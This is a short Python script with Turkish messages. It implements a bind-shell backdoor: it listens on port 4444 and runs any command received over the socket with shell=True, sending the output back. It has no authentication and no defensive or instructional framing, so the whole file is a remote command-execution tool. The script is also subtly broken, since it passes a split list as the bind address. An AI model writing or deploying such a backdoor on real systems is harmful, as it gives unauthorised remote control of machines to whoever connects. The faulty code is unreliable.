import socket
import subprocess

def run_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except subprocess.CalledProcessError as e:
        return str(e)

def start_server():
    server_host = input('IP: ').split(" ")
    server_port = 4444

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_host, server_port))
    server_socket.listen(5)

    print(f"Sunucu {server_host}:{server_port}'de çalışıyor...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"{addr[0]} sunucuya bağlandı")

        while True:
            command = client_socket.recv(1024).decode()
            if not command:
                break
            elif command.lower() == "exit":
                client_socket.close()
                break
            else:
                response = run_command(command)
                client_socket.send(response.encode())

if __name__ == "__main__":
    start_server()
